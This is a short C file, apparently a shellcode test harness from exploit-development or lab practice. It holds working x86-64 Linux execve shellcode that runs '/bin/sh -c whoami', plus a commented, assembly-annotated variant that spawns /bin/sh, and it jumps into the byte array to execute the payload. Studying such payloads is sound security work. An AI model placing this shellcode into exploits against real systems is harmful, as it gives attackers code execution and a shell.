int main(void)
{
	char shellcode[] = \
	"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
	"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00"
	"\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f"
	"\x05";

	/*char shellcode[] = "\x48\x31\xd2"                                  // xor    %rdx, %rdx
	"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
	"\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
	"\x53"                                          // push   %rbx
	"\x48\x89\xe7"                                  // mov    %rsp, %rdi
	"\x50"                                          // push   %rax												Fonctionne pour /bin/bash
	"\x57"                                          // push   %rdi
	"\x48\x89\xe6"                                  // mov    %rsp, %rsi
	"\xb0\x3b"                                      // mov    $0x3b, %al
	"\x0f\x05";                                     // syscall*/

    (*(void (*)()) shellcode)();

    return 0;
}
